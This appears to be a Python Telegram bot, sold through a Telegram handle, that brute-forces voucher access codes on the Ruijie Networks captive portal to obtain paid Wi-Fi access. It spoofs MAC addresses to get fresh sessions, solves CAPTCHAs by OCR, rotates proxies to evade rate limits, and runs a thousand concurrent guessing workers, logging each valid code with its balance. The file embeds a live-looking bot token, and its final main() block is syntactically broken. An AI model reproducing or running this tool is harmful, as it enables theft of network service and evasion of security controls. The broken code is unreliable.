import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
from threading import Thread
from flask import Flask

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# SOCKS proxy support
from aiohttp_socks import ProxyConnector, ProxyType

# ---------------- CONFIGURATION ----------------
TIMEOUT_SEC = 30
MAX_CODES_PER_SID = 30
MAX_CODES_PER_SESSION = 30
NUM_WORKERS = 1000

# ⚠️ သင်၏ Telegram User ID ဖြင့် အစားထိုးပါ။
ADMIN_IDS = [6650624156]  

# Bot Token ကို ဤနေရာတွင် ထည့်ပါ
BOT_TOKEN = "8441636785:AAEOpxPrOTOl2lefx9oOW9-mS1IDi7FhNX4"  

PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

# ==================== FLASK SERVER (24/7 Keep Alive) ====================
app_flask = Flask('')

@app_flask.route('/')
def home():
    return "Bot is running 24/7!"

def run_flask():
    app_flask.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
# ========================================================================


# ==================== PROXY MANAGER ====================
class ProxyManager:
    """proxies.txt ကနေ proxy တွေကို load လုပ်ပြီး round-robin နဲ့ rotate လုပ်တယ်"""

    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies: list[str] = []
        self.bad_proxies: set[str] = set()
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str) -> str | None:
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "http://" + proxy  
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, "r") as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")

    def reload(self):
        self.load()

    async def get_next(self) -> str | None:
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def mark_bad(self, proxy: str | None):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    def stats(self) -> tuple[int, int]:
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad


_proxy_manager: ProxyManager | None = None


def get_proxy_manager() -> ProxyManager:
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


# ==================== END PROXY MANAGER ====================

# ---------------- GLOBALS for OCR ----------------
_ocr_instance = None


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ---------------- PER-USER DATA ----------------
user_scanners = {}


def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {
                "tried": 0,
                "hits": 0,
                "expired": 0,
                "limits": 0,
                "start_time": time.time(),
            },
            "valid_codes": [],
            "limit_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "recheck_queue": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
        }
    return user_scanners[user_id]


# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return None, None
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query["mac"] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(
            spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False
        ) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(
                    final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False
                ) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None


# ---------------- CREATE CONNECTOR FROM PROXY STRING ----------------
def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)


# ---------------- BALANCE CHECKER (proxy string ကို လက်ခံ) ----------------
async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                    except Exception as json_err:
                        raw_text = await resp.text()
                        return f"❌ JSON Error: {json_err} | Body: {raw_text[:100]}"
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return (
                            f"❌ Unexpected format: {type(inner)} | {str(inner)[:100]}"
                        )
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    body_snippet = ""
                    try:
                        body_snippet = (await resp.text())[:150]
                    except:
                        pass
                    return f"❌ HTTP {resp.status}: {body_snippet}"
    except Exception as e:
        return f"❌ Net/Other: {type(e).__name__}: {e}"


async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token, code, proxy_str)

    for item in ud["valid_codes"]:
        if item["code"] == code:
            item["balance_str"] = balance_str
            break

    ud["recent_logs"].append(f"✅ HIT: {code} | {balance_str}")
    ud["dash_update_event"].set()


# ---------------- CHECK SINGLE ACCESS CODE ----------------
async def check_single_access_code(
    session,
    code,
    current_session_id,
    login_url,
    captcha_base_url,
    verify_url,
    headers,
    user_id,
    current_proxy,
):
    ud = get_user_data(user_id)
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    retry_count = 0
    while not ud["stop_event"].is_set():
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            await asyncio.sleep(0.01)
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(
                verify_url, json=v_payload, headers=headers, ssl=False
            ) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue

                l_payload = {
                    "accessCode": code,
                    "sessionId": current_session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                async with session.post(
                    login_url, json=l_payload, headers=headers, ssl=False
                ) as l_resp:
                    ud["stats"]["tried"] += 1
                    l_text = (await l_resp.text()).lower()

                    if "request limited" in l_text:
                        retry_count += 1
                        if retry_count < 5:
                            continue
                        else:
                            return "limit"

                    if '"success":true' in l_text:
                        ud["stats"]["hits"] += 1
                        if not any(item["code"] == code for item in ud["valid_codes"]):
                            ud["valid_codes"].append(
                                {"code": code, "balance_str": "...fetching..."}
                            )

                        ud["dash_update_event"].set()

                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        if token_match:
                            active_token = token_match.group(1)
                            asyncio.create_task(
                                check_balance(
                                    active_token, code, user_id, current_proxy
                                )
                            )
                        return "hit"
                    elif "expired" in l_text:
                        ud["stats"]["expired"] += 1
                        return "expired"
                    elif (
                        "the number of sta exceeds the limit" in l_text
                        or "limit" in l_text
                    ):
                        ud["stats"]["limits"] += 1
                        if code not in ud["limit_codes"]:
                            ud["limit_codes"].append(code)
                        ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
                        return "limit"
                    return "failed"
        except Exception:
            return "failed"
    return "failed"


# ---------------- WORKER (Proxy Rotation + Session Rotation) ----------------
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    while not ud["stop_event"].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue

        proxy_connector = create_connector_for_proxy(proxy)

        async with aiohttp.ClientSession(
            connector=proxy_connector, connector_owner=True
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0

            while (
                not ud["stop_event"].is_set()
                and codes_checked_this_session < MAX_CODES_PER_SESSION
            ):
                if (
                    current_session_id is None
                    or codes_checked_this_sid >= MAX_CODES_PER_SID
                ):
                    sid, mac = await get_sid_from_gateway(
                        session, ud["portal_url"], user_id
                    )
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 3:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(1)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0

                # Generate random code according to current mode
                while not ud["stop_event"].is_set():
                    if ud["mode"] == "custom" and ud["start_digit"] is not None:
                        body_chars = random.choices(
                            ud["char_set"], k=ud["code_len"] - 1
                        )
                        random.shuffle(body_chars)
                        code = ud["start_digit"] + "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                    if code not in ud["tried_codes"]:
                        ud["tried_codes"].add(code)
                        break
                    await asyncio.sleep(0.001)

                if ud["stop_event"].is_set():
                    break

                ud["CURRENT_CODE"] = code
                result = await check_single_access_code(
                    session,
                    code,
                    current_session_id,
                    login_url,
                    captcha_base_url,
                    verify_url,
                    headers,
                    user_id,
                    proxy,
                )
                codes_checked_this_sid += 1
                codes_checked_this_session += 1


# ---------------- LIVE DASHBOARD ----------------
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud["stop_event"].is_set():
        if ud["dash_msg_id"] is None:
            await asyncio.sleep(0.5)
            continue
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0

            proxy_total, proxy_active = pm.stats()

            hit_list = []
            for item in ud["valid_codes"]:
                c = item["code"]
                balance = item.get("balance_str", "...fetching...")
                hit_list.append(f"{c} {balance}")
            hit_str = "\n".join(hit_list) if hit_list else "None yet"

            text = (
                f"⚡ Scanner Running ⚡\n"
                f"Thank for using By Telegram @setting2010\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🏹 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"🍼 Hits: {stats['hits']}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🍼 **Hit Codes**:\n{hit_str}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
            )
            if ud["recent_logs"]:
                last_log = ud["recent_logs"][-1]
                text += f"🍼 Last: {last_log}\n"

            keyboard = InlineKeyboardMarkup(
                [[InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")]]
            )

            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard,
            )
        except Exception:
            pass

        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
            ud["dash_update_event"].clear()
        except asyncio.TimeoutError:
            pass


# ---------------- START SCANNER ----------------
async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)

    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"⚠️ **No proxies loaded!**\n\n",
            parse_mode=ParseMode.MARKDOWN,
        )

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
    }

    ud["dash_update_event"].clear()
    tasks = [
        asyncio.create_task(live_dashboard_updater(context, user_id)),
    ]
    worker_count = NUM_WORKERS
    for i in range(worker_count):
        tasks.append(
            asyncio.create_task(
                worker(i, login_url, captcha_base_url, verify_url, headers, user_id)
            )
        )

    ud["task"] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass
    finally:
        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0

        proxy_total, proxy_active = pm.stats()

        hit_list = []
        for item in ud["valid_codes"]:
            c = item["code"]
            balance = item.get("balance_str", "...fetching...")
            hit_list.append(f"{c} {balance}")
        hit_str = "\n".join(hit_list) if hit_list else "None"

        final_text = (
            f"🛑 Scanner Stopped/Finished\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Total Tried: {stats['tried']:,}\n"
            f"🟢 Hits: {stats['hits']}\n"
            f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 **All Hit Codes**:\n{hit_str}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )

        if ud["dash_msg_id"]:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud["dash_msg_id"], text=final_text
                )
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text)

        ud["stop_event"].clear()
        ud["dash_msg_id"] = None
        ud["task"] = None  


# ---------------- KEYBOARDS & HANDLERS ----------------
def get_main_menu_markup():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="🌐 Update Portal", callback_data="btn_update_portal"
                )
            ],
            [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu")],
            [
                InlineKeyboardButton(
                    text="➕ Add Proxies", callback_data="btn_add_proxies"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🚀 Start Scanner", callback_data="btn_start_scanner"
                )
            ],
        ]
    )


# ---------- Admin check decorator helper ----------
def admin_only(func):
    async def wrapper(
        update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs
    ):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            if update.effective_message:
                await update.effective_message.reply_text(
                    "⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။ အသုံးပြုချင်ပါက telegram @setting2010 ဆီမှာ ဝယ်ယူပါ👊👊"
                )
            return
        return await func(update, context, *args, **kwargs)

    return wrapper


# ---------- Handlers (admin-only enforced) ----------
@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = None

    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()

    msg = await update.message.reply_text(
        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
        reply_markup=get_main_menu_markup(),
        parse_mode=ParseMode.MARKDOWN,
    )
    ud["menu_msg_id"] = msg.message_id


@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = "waiting_for_proxy_text"
    ud["menu_msg_id"] = update.effective_message.message_id
    await update.message.reply_text(
        "📥 **Proxy များကို ယခုပို့ပါ**\n", parse_mode=ParseMode.MARKDOWN
    )


@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.edit_text("🌐 **Portal URL ကို ပို့ပေးပါ။**")

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Number 6", callback_data="set_mode_num6"
                    ),
                    InlineKeyboardButton(
                        text="Number 7", callback_data="set_mode_num7"
                    ),
                    InlineKeyboardButton(
                        text="Number 8", callback_data="set_mode_num8"
                    ),
                ],
                [InlineKeyboardButton(text="Number 9", callback_data="set_mode_num9")],
                [
                    InlineKeyboardButton(text="Abc 6", callback_data="set_mode_abc6"),
                    InlineKeyboardButton(text="Mix 6", callback_data="set_mode_mix6"),
                    InlineKeyboardButton(text="Mix 7", callback_data="set_mode_mix7"),
                    InlineKeyboardButton(text="Mix 8", callback_data="set_mode_mix8"),
                    InlineKeyboardButton(text="Mix 9", callback_data="set_mode_mix9"),
                ],
                [
                    InlineKeyboardButton(
                        text="Custom Start", callback_data="set_mode_custom"
                    )
                ],
                [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")],
            ]
        )
        await query.message.edit_text(
            "⚙️ **Choose Scanner Mode**", reply_markup=keyboard
        )

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud["mode"] = "num6"
            ud["char_set"] = "012345678"
            ud["code_len"] = 6
            ud["start_digit"] = None
        elif selected_mode == "num7":
            ud["mode"] = "num7"
            ud["char_set"] = "012345678"
            ud["code_len"] = 7
            ud["start_digit"] = None
        elif selected_mode == "num8":
            ud["mode"] = "num8"
            ud["char_set"] = "012345678"
            ud["code_len"] = 8
            ud["start_digit"] = None
        elif selected_mode == "num9":
            ud["mode"] = "num9"
            ud["char_set"] = "012345678"
            ud["code_len"] = 9
            ud["start_digit"] = None
        elif selected_mode == "abc6":
            ud["mode"] = "abc6"
            ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 6
            ud["start_digit"] = None
        elif selected_mode == "mix6":
            ud["mode"] = "mix6"
            ud["char_set"] = "012345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 6
            ud["start_digit"] = None
        elif selected_mode == "mix7":
            ud["mode"] = "mix7"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 7
            ud["start_digit"] = None
        elif selected_mode == "mix8":
            ud["mode"] = "mix8"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 8
            ud["start_digit"] = None
        elif selected_mode == "mix9":
            ud["mode"] = "mix9"
            ud["char_set"] = "2345678" + "abcdefhijkmnpqrstuvwxyz"
            ud["code_len"] = 9
            ud["start_digit"] = None
        elif selected_mode == "custom":
            ud["mode"] = "custom"
            ud["char_set"] = "012345678"
            ud["code_len"] = 6
            ud["state"] = "waiting_for_digit"
            ud["menu_msg_id"] = query.message.message_id
            await query.message.edit_text("🔢 **Start Digit **\nဂဏန်းတစ်လုံးသာ ပြန်ပို့ပေးပါ။")
            return

        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_back_main":
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_add_proxies":
        ud["state"] = "waiting_for_proxy_text"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.edit_text(
            "📥 **Proxy များကို ယခုပို့ပါ**\n"
            "တစ်ကြောင်းလျှင် proxy တစ်ခုစီ\n"
            "ဥပမာ -\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080\n"
            "socks4://host:1080"
        )

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.edit_text(
                "❌ Portal URL မရှိသေးပါ။ ကျေးဇူးပြု၍ `Update Portal` အရင်လုပ်ပါ။"
            )
            return

        # Cancel any running scanner task and wait for it to finish
        if ud["task"] and not ud["task"].done():
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            try:
                await asyncio.wait_for(ud["task"], timeout=10.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                ud["task"].cancel()
                try:
                    await ud["task"]
                except:
                    pass

        # Reset state for a fresh start
        ud["stop_event"].clear()
        ud["stats"] = {
            "tried": 0,
            "hits": 0,
            "expired": 0,
            "limits": 0,
            "start_time": time.time(),
        }
        ud["valid_codes"] = []
        ud["limit_codes"] = []
        ud["tried_codes"] = set()
        ud["recent_logs"] = []
        ud["CURRENT_CODE"] = "----"

        await query.message.edit_text("🔄 Initializing scanner dashboard...")
        ud["dash_msg_id"] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        ud["stop_event"].set()
        ud["dash_update_event"].set()


@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get("state")
    text = update.message.text.strip()

    if state == "waiting_for_portal_url":
        if not text.startswith("http"):
            await update.message.reply_text("❌ ကျေးဇူးပြု၍ ညာဘက် http/https URL ပို့ပါ။")
            return
        ud["portal_url"] = text
        ud["state"] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        msg = await update.message.reply_text(
            f"✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_digit":
        if text in ud["char_set"] and len(text) == 1:
            ud["start_digit"] = text
        else:
            ud["start_digit"] = "0"
        ud["state"] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        msg = await update.message.reply_text(
            f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_proxy_text":
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ Proxy list ဗလာဖြစ်နေပါသည်။ ထပ်မံကြိုးစားပါ။")
            return
        try:
            with open(PROXY_FILE, "w") as f:
                f.write("\n".join(lines) + "\n")
        except Exception as e:
            await update.message.reply_text(f"❌ Proxy ဖိုင်ရေးရာတွင် အမှားအယွင်းရှိ: {e}")
            return
        pm = get_proxy_manager()
        pm.reload()
        total, active = pm.stats()
        ud["state"] = None
        msg = await update.message.reply_text(
            f"✅ **Proxies အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ**\n"
            f"📊 Total: `{total}`\n"
            f"✅ Active: `{active}`\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{active}/{total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )
        ud["menu_msg_id"] = msg.message_id


# ---------------- MAIN ----------------
def main():
    # 24/7 Keep-Alive Flask Server ကို စတင်ခြင်း
    keep_alive()
    
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"[MAIN] Proxy Manager initialized: {active}/{total} active proxies")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is running with python-telegram-bot...")
    print("Thank for using By Telegram@phyo39r")
            app.
run_polling(drop_pending_updates=True, close_loop=False)
            break
        except KeyboardInterrupt:
            print(yellow + "\n[MAIN] Stopped" + reset)
            break
        except Exception as e:
            print(bred + f"[MAIN] Polling error: {type(e).__name__}: {e} — restart 5s" + reset)
            time.sleep(5)


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
